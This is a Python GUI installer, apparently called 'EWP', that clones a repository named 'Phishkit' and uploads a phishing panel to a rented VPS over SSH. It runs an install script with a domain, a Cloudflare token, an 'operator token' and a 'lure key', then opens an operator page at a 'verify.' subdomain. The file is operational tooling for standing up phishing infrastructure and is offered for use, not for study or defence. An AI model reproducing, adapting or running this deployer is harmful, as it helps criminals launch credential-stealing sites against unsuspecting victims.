#!/usr/bin/env python3
# installer.py — EWP installer. Runs on Windows/Mac/Linux.
# Reads installer_config.json next to this file. Clones ./panel from the repo
# if missing. SSHes the panel + install.sh to the VPS and runs the right mode.
#
# Requires: pip install -r requirements.txt

import json
import os
import shutil
import subprocess
import sys
import threading
import queue
import webbrowser
from pathlib import Path

try:
    import customtkinter as ctk
except ImportError:
    print("Missing customtkinter. Run: pip install -r requirements.txt", file=sys.stderr)
    sys.exit(1)

try:
    import paramiko
except ImportError:
    print("Missing paramiko. Run: pip install -r requirements.txt", file=sys.stderr)
    sys.exit(1)

try:
    import requests
except ImportError:
    print("Missing requests. Run: pip install -r requirements.txt", file=sys.stderr)
    sys.exit(1)


HERE         = Path(__file__).resolve().parent
CONFIG_FILE  = HERE / "installer_config.json"
PANEL_DIR    = HERE / "panel"
KNOWN_HOSTS  = HERE / "known_hosts"

DEFAULTS = {
    "ip": "",
    "port": "22",
    "user": "root",
    "password": "",
    "domain": "",
    "cf_token": "",
    "repo_url": "https://github.com/spy890-cyber/Phishkit.git",
    "repo_branch": "main",
    "repo_token": "",
    "install_mode": "full",
    "save_password": True,
    "last_url": "",
    "last_panel_password": "",
}


def load_config():
    if CONFIG_FILE.exists():
        try:
            data = json.loads(CONFIG_FILE.read_text())
            return {**DEFAULTS, **data}
        except Exception:
            pass
    return dict(DEFAULTS)


def save_config(cfg):
    tmp = CONFIG_FILE.with_suffix(".json.tmp")
    tmp.write_text(json.dumps(cfg, indent=2))
    os.replace(tmp, CONFIG_FILE)
    try:
        os.chmod(CONFIG_FILE, 0o600)
    except Exception:
        pass


def preflight_repo(url, token, branch):
    if not url:
        return False, "Repository URL is empty."
    try:
        if token and "github.com" in url:
            auth_url = url.replace("https://", f"https://x-access-token:{token}@")
            r = requests.get(auth_url.replace(".git", ""), timeout=10)
        else:
            r = requests.get(url.replace(".git", ""), timeout=10)
        if r.status_code in (200, 301, 302):
            return True, "ok"
        if r.status_code == 404:
            return False, "Repo not found. If private, add a token under Advanced."
        return False, f"HTTP {r.status_code}"
    except Exception as e:
        return False, f"network error: {e}"


def ensure_panel_cloned(cfg, log):
    if (PANEL_DIR / "app.py").exists() and (PANEL_DIR / "install.sh").exists():
        log("[ok] panel/ present locally")
        return True
    url = cfg["repo_url"]
    if not url:
        log("[err] repo_url not set")
        return False
    clone_url = url
    if cfg.get("repo_token") and "github.com" in url:
        clone_url = url.replace("https://", f"https://x-access-token:{cfg['repo_token']}@")
    log(f"[*] cloning panel/ from {url} (branch {cfg.get('repo_branch','main')})")
    if PANEL_DIR.exists():
        shutil.rmtree(PANEL_DIR, ignore_errors=True)
    try:
        r = subprocess.run(
            ["git", "clone", "--depth", "1",
             "--branch", cfg.get("repo_branch", "main"),
             clone_url, str(PANEL_DIR)],
            capture_output=True, text=True, timeout=180,
        )
        if r.returncode != 0:
            log(f"[err] git clone failed: {r.stderr.strip()}")
            return False
        log("[ok] panel/ cloned")
        return True
    except FileNotFoundError:
        log("[err] git not found. Install git and retry.")
        return False
    except Exception as e:
        log(f"[err] clone error: {e}")
        return False


def refresh_panel(cfg, log):
    if not PANEL_DIR.exists():
        log("[*] nothing to refresh — run INSTALL first")
        return
    log("[*] refreshing panel/ (git pull --rebase)")
    try:
        r = subprocess.run(["git", "-C", str(PANEL_DIR), "pull", "--rebase"],
                           capture_output=True, text=True, timeout=120)
        if r.returncode == 0:
            log(f"[ok] {r.stdout.strip().splitlines()[-1] if r.stdout else 'up to date'}")
        else:
            log(f"[err] pull failed: {r.stderr.strip()}")
    except Exception as e:
        log(f"[err] refresh error: {e}")


def make_ssh_client(cfg, log):
    host = cfg["ip"]; port = int(cfg.get("port") or 22)
    user = cfg["user"]; pwd  = cfg["password"]
    if not host or not user or not pwd:
        log("[err] missing ip / user / password")
        return None
    client = paramiko.SSHClient()
    if KNOWN_HOSTS.exists():
        client.load_host_keys(str(KNOWN_HOSTS))
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        client.connect(host, port=port, username=user, password=pwd, timeout=15,
                       allow_agent=False, look_for_keys=False)
    except Exception as e:
        log(f"[err] SSH connect failed: {e}")
        return None
    try:
        client.save_host_keys(str(KNOWN_HOSTS))
    except Exception:
        pass
    return client


def stream_cmd(client, cmd, log):
    stdin, stdout, stderr = client.exec_command(cmd, get_pty=True)
    for line in iter(stdout.readline, ""):
        line = line.rstrip("\r\n")
        if line:
            log(line)
    rc = stdout.channel.recv_exit_status()
    return rc


def scp_tree(client, src: Path, dst: str, log):
    log(f"[*] scp {src.name} -> {dst}")
    stream_cmd(client, f"rm -rf {dst} && mkdir -p {dst}", log)
    sftp = client.open_sftp()
    try:
        for root, dirs, files in os.walk(src):
            rel = os.path.relpath(root, src)
            remote_dir = dst if rel == "." else f"{dst}/{rel}"
            try: sftp.stat(remote_dir)
            except IOError:
                sftp.mkdir(remote_dir)
            for f in files:
                sftp.put(os.path.join(root, f), f"{remote_dir}/{f}")
    finally:
        sftp.close()
    log("[ok] scp done")


def scp_file(client, src: Path, dst: str, log):
    log(f"[*] scp {src.name} -> {dst}")
    sftp = client.open_sftp()
    try:
        sftp.put(str(src), dst)
    finally:
        sftp.close()


def run_install(cfg, mode, log):
    log(f"[*] mode: {mode}")
    log("[*] ensuring panel/ is present")
    if not ensure_panel_cloned(cfg, log):
        log("[err] aborting")
        return False

    ok, msg = preflight_repo(cfg["repo_url"], cfg.get("repo_token",""), cfg.get("repo_branch","main"))
    if not ok:
        log(f"[warn] repo preflight: {msg}")

    operator_token = os.urandom(32).hex()
    lure_key = os.urandom(16).hex()
    log(f"[*] operator token: {operator_token}")
    log(f"[*] lure key:       {lure_key}")

    log("[*] connecting SSH")
    client = make_ssh_client(cfg, log)
    if not client:
        return False

    try:
        # Copy local panel/ into /tmp/ewp-panel/panel so install.sh, which
        # expects $PKG_DIR/panel/..., finds every file at the right path.
        scp_tree(client, PANEL_DIR, "/tmp/ewp-panel/panel", log)
        scp_file(client, PANEL_DIR / "install.sh", "/tmp/ewp-install.sh", log)
        stream_cmd(client, "chmod +x /tmp/ewp-install.sh && sed -i 's/\\r$//' /tmp/ewp-install.sh", log)

        env = (
            f"DOMAIN={shell_quote(cfg['domain'])} "
            f"CF_TOKEN={shell_quote(cfg['cf_token'])} "
            f"OPERATOR_TOKEN={shell_quote(operator_token)} "
            f"LURE_KEY={shell_quote(lure_key)} "
            f"PKG_DIR=/tmp/ewp-panel "
        )
        cmd = f"{env} bash /tmp/ewp-install.sh {mode}"
        rc = stream_cmd(client, cmd, log)
        if rc != 0:
            log(f"[err] install.sh exit code {rc}")
            return False
        log("[ok] install finished")
        return True
    finally:
        client.close()


def shell_quote(s):
    if s is None: return "''"
    return "'" + s.replace("'", "'\\''") + "'"


class App(ctk.CTk):
    def __init__(self):
        super().__init__()
        ctk.set_appearance_mode("dark")
        ctk.set_default_color_theme("dark-blue")

        self.title("EWP Installer")
        self.geometry("720x820")

        self.cfg = load_config()
        self.log_queue = queue.Queue()
        self.busy = False

        self._build()
        self._pump_log()

    def _build(self):
        pad = {"padx": 20, "pady": (0, 8)}
        ctk.CTkLabel(self, text="EWP INSTALLER", font=ctk.CTkFont(size=20, weight="bold")).pack(pady=(20, 4))
        ctk.CTkLabel(self, text="Fill fields. Values save locally and prefill next time.",
                     font=ctk.CTkFont(size=12)).pack(pady=(0, 14))

        for key, label, show in [
            ("ip",       "SERVER IP",      None),
            ("port",     "SSH PORT",       None),
            ("user",     "LOGIN",          None),
            ("password", "PASSWORD",       "*"),
            ("domain",   "DOMAIN",         None),
            ("cf_token", "CLOUDFLARE TOKEN", "*"),
        ]:
            row = ctk.CTkFrame(self, fg_color="transparent")
            row.pack(fill="x", **pad)
            ctk.CTkLabel(row, text=label, width=160, anchor="w").pack(side="left")
            entry = ctk.CTkEntry(row, show=show)
            entry.insert(0, self.cfg.get(key, "") or "")
            entry.pack(side="left", fill="x", expand=True)
            setattr(self, f"e_{key}", entry)

        adv = ctk.CTkFrame(self)
        adv.pack(fill="x", padx=20, pady=(8, 8))
        ctk.CTkLabel(adv, text="ADVANCED  (repo)", anchor="w").pack(anchor="w", padx=12, pady=(8, 4))
        for key, label, show in [
            ("repo_url",    "Repository URL", None),
            ("repo_branch", "Branch",         None),
            ("repo_token",  "Access token",   "*"),
        ]:
            r = ctk.CTkFrame(adv, fg_color="transparent")
            r.pack(fill="x", padx=12, pady=3)
            ctk.CTkLabel(r, text=label, width=140, anchor="w").pack(side="left")
            e = ctk.CTkEntry(r, show=show)
            e.insert(0, self.cfg.get(key, "") or "")
            e.pack(side="left", fill="x", expand=True)
            setattr(self, f"e_{key}", e)

        btns = ctk.CTkFrame(self, fg_color="transparent")
        btns.pack(fill="x", padx=20, pady=14)

        self.btn_install = ctk.CTkButton(btns, text="INSTALL",
                                         fg_color="#22c55e", hover_color="#16a34a",
                                         text_color="#000", height=42,
                                         command=lambda: self._run("full"))
        self.btn_install.pack(side="left", expand=True, fill="x", padx=(0, 6))

        self.btn_panel = ctk.CTkButton(btns, text="INSTALL ONLY PANEL",
                                       fg_color="#2563eb", hover_color="#1d4ed8",
                                       height=42,
                                       command=lambda: self._run("panel-only"))
        self.btn_panel.pack(side="left", expand=True, fill="x", padx=6)

        self.btn_open = ctk.CTkButton(btns, text="Open Panel",
                                      fg_color="#334155", hover_color="#1e293b",
                                      height=42,
                                      command=self._open_panel)
        self.btn_open.pack(side="left", expand=True, fill="x", padx=(6, 0))

        btns2 = ctk.CTkFrame(self, fg_color="transparent")
        btns2.pack(fill="x", padx=20, pady=(0, 10))
        ctk.CTkButton(btns2, text="Test Connection", height=32, width=160,
                      command=self._test_conn).pack(side="left")
        ctk.CTkButton(btns2, text="Refresh panel from repo", height=32, width=200,
                      command=self._refresh).pack(side="left", padx=8)
        ctk.CTkButton(btns2, text="Copy log", height=32, width=120,
                      command=self._copy_log).pack(side="right")

        ctk.CTkLabel(self, text="Progress", anchor="w").pack(fill="x", padx=20)
        self.log_box = ctk.CTkTextbox(self, height=300, font=ctk.CTkFont(family="Consolas", size=12))
        self.log_box.pack(fill="both", expand=True, padx=20, pady=(4, 20))
        self.log_box.configure(state="disabled")

    def _log(self, msg):
        self.log_queue.put(msg)

    def _pump_log(self):
        try:
            while True:
                msg = self.log_queue.get_nowait()
                self.log_box.configure(state="normal")
                self.log_box.insert("end", msg + "\n")
                self.log_box.see("end")
                self.log_box.configure(state="disabled")
        except queue.Empty:
            pass
        self.after(100, self._pump_log)

    def _copy_log(self):
        try:
            txt = self.log_box.get("1.0", "end")
            self.clipboard_clear()
            self.clipboard_append(txt)
            self._log("[ok] log copied to clipboard")
        except Exception as e:
            self._log(f"[err] copy: {e}")

    def _collect(self):
        for key in ("ip","port","user","password","domain","cf_token",
                    "repo_url","repo_branch","repo_token"):
            self.cfg[key] = getattr(self, f"e_{key}").get().strip()
        return self.cfg

    def _set_busy(self, busy):
        self.busy = busy
        state = "disabled" if busy else "normal"
        self.btn_install.configure(state=state)
        self.btn_panel.configure(state=state)

    def _test_conn(self):
        cfg = self._collect()
        self._log("[*] test connection")
        def work():
            client = make_ssh_client(cfg, self._log)
            if client:
                stream_cmd(client, "whoami && uname -a && df -h / | tail -1", self._log)
                client.close()
                self._log("[ok] ssh ok")
            self._set_busy(False)
        self._set_busy(True)
        threading.Thread(target=work, daemon=True).start()

    def _refresh(self):
        cfg = self._collect()
        save_config(cfg)
        threading.Thread(target=lambda: refresh_panel(cfg, self._log), daemon=True).start()

    def _run(self, mode):
        if self.busy: return
        cfg = self._collect()
        save_config(cfg)
        self._set_busy(True)

        def work():
            try:
                ok = run_install(cfg, mode, self._log)
                if ok:
                    url = f"https://verify.{cfg['domain']}/op"
                    self.cfg["last_url"] = url
                    save_config(self.cfg)
                    self._log(f"[ok] opening {url}")
                    try: webbrowser.open(url)
                    except Exception as e: self._log(f"[warn] open browser: {e}")
                else:
                    self._log("[err] install failed — copy the log and check the VPS")
            except Exception as e:
                self._log(f"[err] unhandled: {e}")
            finally:
                self._set_busy(False)

        threading.Thread(target=work, daemon=True).start()

    def _open_panel(self):
        url = self.cfg.get("last_url") or (
            f"https://verify.{self.cfg.get('domain','')}/op"
            if self.cfg.get("domain") else ""
        )
        if not url:
            self._log("[err] no last_url and no domain set")
            return
        try:
            webbrowser.open(url)
            self._log(f"[ok] opened {url}")
        except Exception as e:
            self._log(f"[err] {e}")


if __name__ == "__main__":
    App().mainloop()
